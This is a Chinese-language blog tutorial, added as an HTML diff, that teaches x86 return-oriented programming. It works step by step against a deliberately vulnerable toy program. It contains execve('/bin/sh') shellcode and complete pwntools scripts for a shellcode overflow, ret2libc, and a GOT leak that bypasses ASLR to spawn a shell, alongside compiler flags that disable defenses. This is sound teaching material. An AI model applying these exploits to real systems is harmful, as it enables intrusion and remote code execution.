@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>一步一步学ROP之x86篇 | √素顏☃繁華夢☪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x1 ROPROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。
+0x2 Control Flow Hijack 程序流劫持比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一步一步学ROP之x86篇">
+<meta property="og:url" content="http://yoursite.com/2017/09/28/一步一步学ROP之x86篇/index.html">
+<meta property="og:site_name" content="√素顏☃繁華夢☪">
+<meta property="og:description" content="0x1 ROPROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。
+0x2 Control Flow Hijack 程序流劫持比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/16.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/17.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/18.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/19.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/20.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/21.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/22.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/23.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/24.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/25.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/26.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/27.png">
+<meta property="og:updated_time" content="2017-12-13T01:05:57.523Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一步一步学ROP之x86篇">
+<meta name="twitter:description" content="0x1 ROPROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。
+0x2 Control Flow Hijack 程序流劫持比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御">
+<meta name="twitter:image" content="http://ote495tnr.bkt.clouddn.com/16.png">
+  
+    <link rel="alternate" href="/atom.xml" title="√素顏☃繁華夢☪" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-一步一步学ROP之x86篇" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/28/一步一步学ROP之x86篇/" class="article-date">
+  <time class="post-time" datetime="2017-09-28T02:37:33.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">28</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一步一步学ROP之x86篇
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x1-ROP"><a href="#0x1-ROP" class="headerlink" title="0x1 ROP"></a>0x1 ROP</h4><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<h4 id="0x2-Control-Flow-Hijack-程序流劫持"><a href="#0x2-Control-Flow-Hijack-程序流劫持" class="headerlink" title="0x2 Control Flow Hijack 程序流劫持"></a>0x2 Control Flow Hijack 程序流劫持</h4><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御措施也提出了各种防御方法，最常见的防御方法有DEP（堆栈不可执行），ASLR(内存地址随机化)，Stack Protector(栈保护)等。</p>
+<p>我们先从最简单的没有任何保护的程序开始，随后在一步步增加各种防御措施，接着在学习绕过的方法。首先看这个有明显缓冲区溢出的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    vulnerable_function();</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>用<code>gcc -fno-stack-protector -z execstack -o level1 level1.c</code>编译。<code>-fno-stack-protector</code>和<code>-z execstack</code>这两个参数会分别关掉DEP和<code>stack protector</code>。同时我们在shell中执行：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/16.png" alt=""></p>
+<p>这几条命令是用来查看ASLR是否开启。用cat命令查看<code>randomize_va_space</code>的值，输出的结果可能是0、1或者2，简单的来说，它们的含义如下所示：<br>0：禁用<br>1：除堆以外随机化<br>2：全部随机化（默认）</p>
+<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/17.png" alt="2"></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/18.png" alt=""></p>
+<p>我们可以得到内存出错的地址为：0x41416d41，然后通过pattern offset addr计算出PC返回值的覆盖点为140个字节。只要构造一个”A”*140+ret字符串，就可以让PC执行ret_addr上的代码了。</p>
+<p>接下来需要一段shellcode,可以用msf生成，或者是自己反编译。网上也有现成的shellcode,可以根据自己的需求去下载。<a href="https://www.exploit-db.com/shellcode/" target="_blank" rel="external">https://www.exploit-db.com/shellcode/</a></p>
+<p>这里我就用现成的shellcode:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</div><div class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</div><div class="line">shellcode += &quot;\x0b\xcd\x80&quot;</div></pre></td></tr></table></figure>
+<p>这里我们使用一段最简单的执行<code>execve(&quot;/bin/sh&quot;)</code>命令作为shellcode,溢出点有了，shellcode有了，下一步就是控制PC跳转到shellcode的地址上,我们可以这样来构造<code>payload=shellcode+&#39;a&#39;*140+ret_addr</code>。看了蒸米的文章，说shellcode的地址是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的地址。但是你真的执行exp的时候你会发现shellcode根本就不在这个地址上。原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，当我们执行./level1的时候，buf的位置会固定在别的地址上。要解决这个问题，我们需要开启core dump或者attach到运行的程序上来看运行时的栈的地址。通过ulimit -c unlimited来开启core dump。然后让程序崩溃调试一下core dump来找shellcode的地址。</p>
+<p>运行<code>ulimit -c unlimited</code>这条命令，然后让程序崩溃，会在桌面上生成一个core的文件</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/19.png" alt="4"></p>
+<p>然后使用gdb查看这个查看core文件就可以获取到buf真正的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# gdb level1 core </div><div class="line">gdb-peda$ x/10s $esp-144</div><div class="line">0xbffff310:	&quot;ABCD&quot;, &apos;A&apos; &lt;repeats 140 times&gt;, &quot;\n\363\377\277&quot;</div><div class="line">0xbffff3a5:	&quot;&quot;</div><div class="line">0xbffff3a6:	&quot;&quot;</div><div class="line">0xbffff3a7:	&quot;&quot;</div><div class="line">0xbffff3a8:	&quot;&quot;</div><div class="line">0xbffff3a9:	&quot;&quot;</div><div class="line">0xbffff3aa:	&quot;&quot;</div><div class="line">0xbffff3ab:	&quot;&quot;</div><div class="line">0xbffff3ac:	&quot;vb\341\267\001&quot;</div><div class="line">0xbffff3b2:	&quot;&quot;</div></pre></td></tr></table></figure>
+<p>因为溢出点是140个字节，再加上4个字节的返回地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令<code>x/10s $esp-144</code>，我们可以得到buffer的地址为0xbffff310。</p>
+<p>现在shellcode和ret_addr都有了，接下来可以去利用了。利用的脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p=process(&apos;./level1&apos;)</div><div class="line">ret_addr=0xbffff310</div><div class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</div><div class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</div><div class="line">shellcode += &quot;\x0b\xcd\x80&quot;</div><div class="line">payload=shellcode+&apos;A&apos;*(140-len(shellcode))+p32(ret_addr)</div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>接下来我们把目标程序绑定到某个服务器的端口上，这里我们可以使用socat这个工具来完成，命令如下：<code>socat TCP4-LISTEN:5555,fork EXEC:./level1</code></p>
+<p>因为现在目标程序是跑在socat的环境中，要把脚本中的p=process(‘./level1’)换成p=remote(‘127.0.0.1’,5555)。但是ret_addr还会发生改变，解决方法还是采用core dump的方案，然后用gdb调试core文件获取返回地址，然后就可以进行远程溢出了。</p>
+<h4 id="0x2-通过ret2libc绕过DEP防护"><a href="#0x2-通过ret2libc绕过DEP防护" class="headerlink" title="0x2 通过ret2libc绕过DEP防护"></a>0x2 通过ret2libc绕过DEP防护</h4><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译的方法如下：<code>gcc -fno-stack-protector -o level2 level2.c</code>这时候如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。通过<code>cat /proc/[pid]/maps</code>查看，你会发现level1的stack是rwx，但是level2的stack却是rw的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">level1: bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]</div><div class="line">level2: bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]</div></pre></td></tr></table></figure></p>
+<p>注意：可以用命令<code>ps -aef | grep file</code>查看pid，但是需要注意的是，先让程序运行在执行命令，否则pid一直在变化。然后用<code>cat /proc/[pid]/maps | grep stack</code>查看程序在栈上的权限。</p>
+<p>如何去执行shellcode呢？我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们可以让程序执行<code>system(&#39;/bin/sh&#39;)</code>的话，也可以获取shell。思路有了，接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
+<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，而且这个字符串的地址也是固定的。接下来我们需要找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/20.png" alt="5"></p>
+<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e38b30以及”/bin/sh”的地址0xb7f5ad28。接下来开始写exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(&apos;./level2&apos;) </div><div class="line">system_addr=0xb7e38b30</div><div class="line">binsh_addr=0xb7f5ad28</div><div class="line">payload = &apos;A&apos;*140+p32(system_addr)+p32(4)+p32(binsh_addr)</div><div class="line">p.send(payload) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就随便写了一个作为返回地址。下面我们测试一下exp：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/21.png" alt="6"></p>
+<h4 id="0x3-通过ROP绕过DEP和ASLR防护"><a href="#0x3-通过ROP绕过DEP和ASLR防护" class="headerlink" title="0x3 通过ROP绕过DEP和ASLR防护"></a>0x3 通过ROP绕过DEP和ASLR防护</h4><p>接下来打开ASLR保护</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/22.png" alt="7"></p>
+<p>现在我们测试一下level2的exp，发现已经不能用了。</p>
+<p>通过ldd查看，可以发现每次libc.so都是变化的。</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/23.png" alt="8"></p>
+<p>如何解决地址随机化的问题？思路是：我们需要先泄露libc.so某些函数在内存中法人地址，然后在利用泄露出的函数根据偏移量计算出system()函数的地址和<code>/bin/sh</code>字符串在内存中的地址，然后执行ret2libc的shellcode。既然栈、libc、heap的地址都是随机的，怎么样才能泄露libc的地址呢？</p>
+<p>所以只要把返回值设置到程序本身就可以执行我们期望的指令。首先利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/24.png" alt="9"></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/25.png" alt="10"></p>
+<p>我们发现除了程序本身的实现的函数之外，我们还可以使用<code>read@plt()</code>和<code>write@plt()</code>函数。但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write@plt()</code>函数就够了，因为我们可以通过<code>write@plt ()</code>函数把<code>write()</code>函数在内存中的地址也就是<code>write.got</code>给打印出来。既然<code>write()</code>函数实现是在<code>libc.so</code>当中，那我们调用的<code>write@plt()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write@plit()</code>会根据<code>write.got</code>跳转到真正的<code>write()</code>函数上去。</p>
+<p>因为<code>system()</code>函数和<code>write()</code>在libc.so中的offset(相对地址)是不变的，所以如果我们得到了<code>write()</code>的地址并且拥有目标服务器上的libc.so就可以计算出<code>system()</code>在内存中的地址了。然后我们再将pc指针return回<code>vulnerable_function()</code>函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了<code>system()</code>在内存中的地址，就可以调用<code>system()</code>函数来获取shell。</p>
+<p>使用ldd命令可以查看目标程序调用的so库。然后把libc.so拷贝到当前目录，因为exp需要这个so文件来计算相对地址：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/26.png" alt="11"></p>
+<p>最后利用的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">libc=ELF(&apos;libc.so&apos;)</div><div class="line">elf=ELF(&apos;./level2&apos;)</div><div class="line"></div><div class="line">p=process(&apos;./level2&apos;)</div><div class="line"></div><div class="line">write_plt=elf.symbols[&apos;write&apos;]</div><div class="line">print &apos;write_plt=&apos;+hex(write_plt)</div><div class="line">write_got=elf.got[&apos;write&apos;]</div><div class="line">print &apos;write_got=&apos;+hex(write_got)</div><div class="line">vulfun_addr = 0x804844d</div><div class="line">print &apos;vulfun=&apos;+hex(vulfun_addr)</div><div class="line"></div><div class="line">payload1=&apos;A&apos;*140+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(write_got)+p32(4)</div><div class="line">p.send(payload1)</div><div class="line"></div><div class="line">write_addr=u32(p.recv(4))</div><div class="line">print &apos;write_addr=&apos;+hex(write_addr)</div><div class="line"></div><div class="line">system_addr=write_addr-(libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])</div><div class="line">print &apos;system_addr=&apos;+hex(system_addr)</div><div class="line">binsh_addr=write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</div><div class="line">print &apos;binsh_addr=&apos;+hex(binsh_addr)</div><div class="line"></div><div class="line">payload2=&apos;A&apos;*140+p32(system_addr)+p32(vulfun_addr)+p32(binsh_addr)</div><div class="line">p.send(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/27.png" alt="12"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/28/一步一步学ROP之x86篇/" data-id="cjfgehm2y000avgun3zdxrxq4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术文章/">技术文章</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/10/12/pwntools的安装方法/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          pwntools的安装方法
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/23/格式化字符串漏洞利用（二）/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">格式化字符串漏洞利用（二）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">√素顏☃繁華夢☪</h1>
+    <h2 class="blog-subtitle">Go!Go!Go!</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/xiaorui1234" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://foxroot.cn/" target="_blank" title="FoxRoot">
+          FoxRoot
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 XiaoRui<br>
+      
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
